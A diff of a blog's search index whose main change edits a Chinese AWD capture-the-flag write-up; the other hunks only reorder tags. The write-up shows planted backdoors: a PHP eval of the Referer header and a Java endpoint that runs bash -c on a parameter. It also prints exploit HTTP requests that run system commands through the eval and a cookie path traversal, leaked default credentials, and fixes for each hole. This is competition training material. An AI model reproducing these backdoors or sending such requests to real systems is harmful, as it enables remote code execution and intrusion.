@@ -134,14 +134,13 @@
     <title>第一届长城杯信息安全铁人三项赛半决赛（第三赛区）AWD WP</title>
     <url>/posts/359b7a99/</url>
     <content><![CDATA[<p>rank: 6</p>
-<h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h2 id="漏洞1-文件上传getshell"><a href="#漏洞1-文件上传getshell" class="headerlink" title="漏洞1-文件上传getshell"></a>漏洞1-文件上传getshell</h2><p><code>data.sql</code>泄露admin账号密码</p>
+<h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h2 id="漏洞1-文件上传getshell"><a href="#漏洞1-文件上传getshell" class="headerlink" title="漏洞1-文件上传getshell"></a>漏洞1-文件上传getshell</h2><p><code>data.sql</code>泄露教师账号密码</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `teacher` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin1&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;admin@qq.com&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>登录后台<code>login.jsp</code></p>
 <p>后台用户上传头像处存在任意文件上传</p>
 <p><img src="/img/awd/ccb-tomcat-1.png"></p>
 <p><strong>攻击：</strong></p>
-<p>脚本批量改密码后批量获取flag</p>
 <p><img src="/img/awd/ccb-tomcat-2.png"></p>
 <p><strong>修复：</strong></p>
 <p>修改后台密码&#x2F;修改上传代码&#x2F;增加waf</p>
@@ -170,9 +169,13 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">api</span>\<span class="hljs-title class_">controller</span>\<span class="hljs-title class_">v1</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">fun</span>\<span class="hljs-title">auth</span>\<span class="hljs-title">Api</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">App</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Config</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 生成token</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Token</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Api</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$noAuth</span> = [<span class="hljs-string">&#x27;*&#x27;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">App <span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$app</span>);<br>        <span class="hljs-comment">//跨域</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Headers:Accept,Referer,Host,Keep-Alive,User-Agent,X-Requested-With,Cache-Control,Content-Type,Cookie,token&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials:true&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods:GET, POST, PATCH, PUT, DELETE,OPTIONS&#x27;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">build</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refresh</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-string">&#x27;\\fun\\auth\\&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$this</span>-&gt;type).<span class="hljs-string">&#x27;Token&#x27;</span>);<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$class</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$token</span>-&gt;<span class="hljs-title function_ invoke__">refresh</span>();<br><br>    &#125;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()[<span class="hljs-string">&#x27;Referer&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><strong>攻击：</strong></p>
-<p><code>/api/v1.token/test</code><br><code>Referer:system(&quot;cat /flag&quot;);</code></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/api/</span>v1.token<span class="hljs-regexp">/test HTTP/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">8.147</span>.<span class="hljs-number">134.118</span>:<span class="hljs-number">24631</span><br>Referer:system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><br><br></code></pre></td></tr></table></figure>
+
+
 <p><strong>修复：</strong></p>
-<p>注释<code>//@eval(getallheaders()[&#39;Referer&#39;]);</code></p>
+<p>添加注释</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//@eval(getallheaders()[&#x27;Referer&#x27;]);</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
 <h2 id="漏洞3-文件上传getshell"><a href="#漏洞3-文件上传getshell" class="headerlink" title="漏洞3-文件上传getshell"></a>漏洞3-文件上传getshell</h2><p><del>貌似还有个任意文件上传，比赛的时候没时间看了</del></p>
 <p><strong>赛后复现</strong></p>
 <p>注册后的基本设置有上传头像的地方</p>
@@ -192,10 +195,11 @@
 
 <p>或者稍微麻烦一点的，增加一个白名单</p>
 <p>&#x2F;app&#x2F;frontend&#x2F;controller&#x2F;Ajax.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Json</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DataNotFoundException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DbException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\ModelNotFoundException</span><br><span class="hljs-comment"> * 文件上传总入口 集成qiniu ali tenxunoss</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploads</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$list</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>];<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalName</span>(), PATHINFO_EXTENSION));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$list</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;NO&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$upload</span> = <span class="hljs-title class_">UploadService</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">uploads</span>(<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;member.id&#x27;</span>),<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Json</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DataNotFoundException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\DbException</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> \think\db\exception\ModelNotFoundException</span><br><span class="hljs-comment"> * 文件上传总入口 集成qiniu ali tenxunoss</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploads</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-variable">$list</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>];<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalName</span>(), PATHINFO_EXTENSION));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$list</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;NO&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$upload</span> = <span class="hljs-title class_">UploadService</span>::<span class="hljs-title function_ invoke__">instance</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">uploads</span>(<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;member.id&#x27;</span>),<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
-<h2 id="漏洞4-后台文件上传-文件包含RCE"><a href="#漏洞4-后台文件上传-文件包含RCE" class="headerlink" title="漏洞4-后台文件上传+文件包含RCE"></a>漏洞4-后台文件上传+文件包含RCE</h2><p>F12 泄露账号密码</p>
+<h2 id="漏洞4-后台文件上传-文件包含RCE"><a href="#漏洞4-后台文件上传-文件包含RCE" class="headerlink" title="漏洞4-后台文件上传+文件包含RCE"></a>漏洞4-后台文件上传+文件包含RCE</h2><p><strong>赛后复现</strong></p>
+<p>F12 泄露账号密码</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    layui.<span class="hljs-title function_">use</span>([<span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-string">&#x27;jquery&#x27;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> $ = layui.<span class="hljs-property">jquery</span>,<br>            layer = layui.<span class="hljs-property">layer</span>;<br>        $(<span class="hljs-string">&#x27;.layui-tips&#x27;</span>).<span class="hljs-title function_">hover</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            layer.<span class="hljs-title function_">tips</span>(<span class="hljs-string">&#x27;账号admin,密码123456&#x27;</span>);<br>        &#125;)<br>    &#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 <p>访问<code>/backend</code>登录后台</p>
@@ -227,7 +231,8 @@
 <p><img src="/img/awd/ccb-cms-4.png"></p>
 <figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">POST / HTTP/1.1<br>Host: 0dbaba9b-169b-4afb-ab9d-71f60e228260.ctfd.lewiserii.top:8080<br>Cookie: think_lang=/../../../addons/shell;<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 19<br><br>a=system(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure>
 
-
+<p><strong>修复</strong></p>
+<p>对 $lang 进行过滤即可</p>
 <h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="漏洞1-默认后门"><a href="#漏洞1-默认后门" class="headerlink" title="漏洞1-默认后门"></a>漏洞1-默认后门</h2><p>存在默认后门</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.doctoolkit.controller.test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/test&quot;&#125;)</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-comment">/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/backd0or&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">backdoor</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;cmd&quot;)</span> String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (command != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osType</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osType != <span class="hljs-literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len);<br>            <span class="hljs-keyword">return</span> output;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -754,8 +759,8 @@
       </categories>
       <tags>
         <tag>总结</tag>
-        <tag>反序列化</tag>
         <tag>python</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -1102,8 +1107,8 @@
       <tags>
         <tag>wp</tag>
         <tag>2023</tag>
-        <tag>羊城杯</tag>
         <tag>awdp</tag>
+        <tag>羊城杯</tag>
       </tags>
   </entry>
   <entry>
@@ -2326,15 +2331,15 @@
 <p><img src="https://github.com/dr0n1/auto_deploy/blob/main/auto_deploy.gif?raw=true"></p>
 <h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加 python 安装模块<br>V1.2: 优化安装逻辑等<br>V1.3：移除 python，新增 golang 和 java<br>V2.1：增加 CTF-Misc 部分工具的安装<br>V2.2：优化可重复运行脚本逻辑<br>V2.3：优化部分 python 模块安装逻辑<br>V2.4：增加部分misc工具，格式化代码<br>V3.1：移除了centos的工具支持，增加golang多版本支持等</p>
 <h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加 web 系列工具</p>
-<p>有疑问或者有更好的建议请联系<a href="mailto:&#49;&#57;&#x33;&#48;&#55;&#55;&#52;&#51;&#x37;&#52;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;">&#49;&#57;&#x33;&#48;&#55;&#55;&#52;&#51;&#x37;&#52;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;</a></p>
+<p>有疑问或者有更好的建议请联系<a href="mailto:&#x31;&#x39;&#51;&#48;&#x37;&#55;&#52;&#51;&#x37;&#x34;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#x39;&#51;&#48;&#x37;&#55;&#52;&#51;&#x37;&#x34;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;</a></p>
 ]]></content>
       <categories>
         <category>项目</category>
       </categories>
       <tags>
         <tag>misc</tag>
-        <tag>自动化</tag>
         <tag>脚本</tag>
+        <tag>自动化</tag>
       </tags>
   </entry>
   <entry>
@@ -2870,8 +2875,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>php</tag>
+        <tag>总结</tag>
         <tag>反序列化</tag>
       </tags>
   </entry>
@@ -3471,8 +3476,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>强国杯</tag>
         <tag>2022</tag>
+        <tag>强国杯</tag>
       </tags>
   </entry>
   <entry>
@@ -3534,8 +3539,8 @@
         <category>wp</category>
       </categories>
       <tags>
-        <tag>awd</tag>
         <tag>wp</tag>
+        <tag>awd</tag>
         <tag>台州</tag>
         <tag>2022</tag>
       </tags>
@@ -4011,8 +4016,8 @@
         <category>php</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>php</tag>
+        <tag>总结</tag>
         <tag>trick</tag>
       </tags>
   </entry>
@@ -4298,8 +4303,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>强国杯</tag>
         <tag>2022</tag>
+        <tag>强国杯</tag>
       </tags>
   </entry>
   <entry>
@@ -4419,8 +4424,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>内存取证</tag>
         <tag>流量分析</tag>
       </tags>
@@ -4638,8 +4643,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>隐写术</tag>
       </tags>
   </entry>
@@ -5221,8 +5226,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>隐写</tag>
         <tag>压缩文件</tag>
       </tags>
@@ -5420,8 +5425,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>misc</tag>
+        <tag>总结</tag>
         <tag>编码</tag>
         <tag>密码</tag>
       </tags>
@@ -5935,8 +5940,8 @@
         <category>项目</category>
       </categories>
       <tags>
-        <tag>docker</tag>
         <tag>misc</tag>
+        <tag>docker</tag>
         <tag>ctfd</tag>
         <tag>pwn</tag>
         <tag>web</tag>
@@ -5998,8 +6003,8 @@
         <category>python</category>
       </categories>
       <tags>
-        <tag>python</tag>
         <tag>flask</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -6291,8 +6296,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>台州</tag>
         <tag>2021</tag>
+        <tag>台州</tag>
       </tags>
   </entry>
   <entry>
@@ -6382,8 +6387,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>2021</tag>
         <tag>nuaa</tag>
+        <tag>2021</tag>
       </tags>
   </entry>
   <entry>
@@ -6947,8 +6952,8 @@
         <category>awd</category>
       </categories>
       <tags>
-        <tag>awd</tag>
         <tag>docker</tag>
+        <tag>awd</tag>
       </tags>
   </entry>
   <entry>
